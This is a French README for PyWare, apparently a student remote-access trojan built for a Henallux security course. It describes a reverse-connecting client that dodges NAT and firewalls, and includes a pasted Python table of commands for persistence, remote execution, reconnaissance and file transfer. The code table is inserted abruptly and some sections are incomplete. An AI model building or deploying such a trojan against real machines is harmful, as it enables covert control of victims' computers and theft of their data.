# PyWare
## Introduction
PyWare est un petit malware écrit en python. Il rentre dans le cadre du cursus de sécurité des système de la [Henallux](https://www.henallux.be/). En particulier le cours R209: Developpement donné en deuxième bachelier.

PyWare ne se charge pas de l'infection et part du postula que la victime est déjà infecté pour le démarrage de PyWare.

## Prérequis
L'ensemble des programmes ont été écrit et testé avec [Python](https://www.python.org) [3.7.2](https://www.python.org/downloads/release/python-372/) . Celui-ci est nécessaire sur les deux machines et de préférence ajouté à la variable d'environnement PATH. De plus, le module [PyCryptodome](https://pycryptodome.readthedocs.io) est nécessaire sur le serveur de l'attaquant. Si le module n'est pas présent sur la victime, une fonctionnalité de PyWare l'intalle.

## Architecture
L'attaquant fait office de serveur et attant la connection depuis la victime. La victime, de son côté, essaye une connection vers l'un des serveur de l'attaquant à un interval de temps déterminer. Cette solution permet de s'affranchir des informations de connection de la victime. De plus, elle permet de contourner les problèmes lié au NAT et Firewall. Une fois la connection établie, un shell intéractif est ouvert côté attanquant et les diverses commandes acceptable sont ensuite transféré à la victime. Le retour de la commande est renvoyé à l'attaquant et est affichée.

## Fonctionnement
- Attaquant
  - PyWareGen : Générateur du fichier de configuration listant les différents serveurs que l'attaquant peut utiliser, ainsi que leurs informations de connection.
  - PyWareServ : Serveur de connection. Il attend une connection de la victime puis ouvre un shell intérectif.
- Victime
  - Malware : Client de connection vers le serveur. Il essaye d'ouvrir une connection vers celui-ci à partir du fichier de configuration. Le nom du fichier est laissé libre à l'utilisateur. Il nécéssite aussi le fichier *crypto.py*.
  - Configuration : Fichier de configuration regroupant 

## Fonctionnalitées
### Fonctions de bases
 - exit : Termine la connection entre les deux machines et ferme le programme côté attaquant. Par contre, PyWare continue de tourner sur la cible et retente une connection vers le serveur sélectionnné à un interval de temps déterminer dans le fichier de configuration. Pour arrêter le programme sur les deux machines, utilisez la commande *kill*.
 - kill : Termine la connection et ferme les programmes des deux côtés.
 - quit : Alias de la commande *exit*.

### Fonctions côté serveur
Ces fonctionnalitée ne sont exécuté que du côté du serveur et ne transmet rien à la victime. 
 - help \[commands,\]: Affiche les différentes commandes demandé par l'utilisteur, ainsi qu'une brêve explications de chacun d'elles. Si aucune commande n'est fournis, il affiche alors toutes les commandes disponibles.
 - list : List les différentes commandes disponibles


                                   "/pwd": command_tuple(lambda: self.local_pwd(),
                                                         "/pwd",
                                                         "Get the current working directory on the local machine."),
                                   "/cd": command_tuple(lambda arg="": self.local_cd(arg),
                                                        "/cd Dir",
                                                        "Change the working directory to \'Dir\'"
                                                        " on the local machine."),
                                   "/ls": command_tuple(lambda arg="": self.local_ls(arg),
                                                        "/ls [Dir]",
                                                        "List files and directory of \'Dir\'  on the local machine."
                                                        " If \'Dir\' is not specify, list the current directory."),
                                   "/dir": command_tuple(lambda arg="": self.local_ls(arg),
                                                         "/dir [Dir]",
                                                         "Alias for \'/ls\'."),
                                   "getinfo": command_tuple(lambda arg="": self.getinfo(arg),
                                                            "getinfo [options,]",
                                                            "Get information from the victim. Options available : "
                                                            "user, hostname, fqdn, ip, os, version, architecture, "
                                                            "language, time"),
                                   "autostart": command_tuple(lambda arg="": self.autostart(arg),
                                                              "autostart [Name]",
                                                              "PyWare on client starts automatically."
                                                              " [Name] is the name used for the registration"),
                                   "newkeys": command_tuple(lambda: self.newkeys(),
                                                            "newkeys",
                                                            "Generate and use a new session key."),
                                   "exec": command_tuple(lambda arg="": self.exec(arg),
                                                         "exec command",
                                                         "Execute a command on the client and print result."
                                                         " Warning, it is an integrative mode."),
                                   "getusers": command_tuple(lambda: self.getusers(),
                                                             "getusers",
                                                             "List all users on the ditant system."),
                                   "installmodules": command_tuple(lambda: self.install_modules(),
                                                                   "installmodules",
                                                                   "Install the python modules for full compatibility."
                                                                   " A reload is needed after."),
                                   "reload": command_tuple(lambda: self.reload(),
                                                           "reload",
                                                           "Reload the client on the target."),
                                   "getservices": command_tuple(lambda: self.getservices(),
                                                                "getservicse",
                                                                "Get the list of the running services."),
                                   "ps": command_tuple(lambda: self.getservices(),
                                                       "ps",
                                                       "Alias for getservices"),
                                   "pwd": command_tuple(lambda: self.pwd(),
                                                        "pwd",
                                                        "Get the current working directory."),
                                   "cd": command_tuple(lambda arg="": self.cd(arg),
                                                       "cd Dir",
                                                       "Change the working directory to \'Dir\' ."),
                                   "ls": command_tuple(lambda arg="": self.ls(arg),
                                                       "ls [Dir]",
                                                       "List files and directory of \'Dir\' . If \'Dir\'"
                                                       " is not specify, list the current working directory."),
                                   "dir": command_tuple(lambda arg="": self.ls(arg),
                                                        "dir [Dir]",
                                                        "Alias for \'ls\'."),
                                   "download": command_tuple(lambda arg="": self.download(arg),
                                                             "download File",
                                                             "Download from the target to local computer."),
                                   "upload": command_tuple(lambda arg="": self.upload(arg),
                                                           "upload File",
                                                           "Upload file to the server")}

                                                         
## Algorithmique
Pour comprendre comment fonctionne les différentes fichiers, veuillez vous référer au fichier [algorithmique.md](algorithmique.md).

## Références
